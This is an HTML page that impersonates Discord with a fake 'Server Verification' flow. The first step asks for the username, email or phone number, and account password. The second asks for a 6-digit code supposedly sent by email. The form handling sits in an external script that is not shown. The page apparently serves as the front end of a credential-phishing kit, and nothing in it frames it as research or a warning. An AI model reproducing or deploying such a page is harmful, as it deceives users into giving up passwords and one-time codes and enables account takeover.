<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Verification</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="card" id="step1">
      <div class="header">
        <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" alt="Discord" class="icon">
        <h2>Server Verification</h2>
        <p>Complete verification to access the server</p>
        <div class="dots">
          <span class="dot active"></span>
          <span class="dot"></span>
        </div>
      </div>
      <form id="verifyForm">
        <label>Discord Username</label>
        <input type="text" id="username" placeholder="username#1234" required>
        
        <label>Email or Phone Number</label>
        <input type="text" id="email" placeholder="you@example.com or +1234567890" required>
        
        <label>Password</label>
        <input type="password" id="password" placeholder="********" required>
        
        <button type="submit">Verify Account</button>
        <p class="terms">By registering, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
      </form>
    </div>

    <div class="card hidden" id="step2">
      <div class="header">
        <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" alt="Discord" class="icon">
        <h2>Email Verification</h2>
        <p>Please enter the 6-digit code sent to your email</p>
        <div class="dots">
          <span class="dot"></span>
          <span class="dot active"></span>
        </div>
      </div>
      <form id="codeForm">
        <label>Enter Code</label>
        <input type="text" id="code" placeholder="123456" maxlength="6" required>
        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
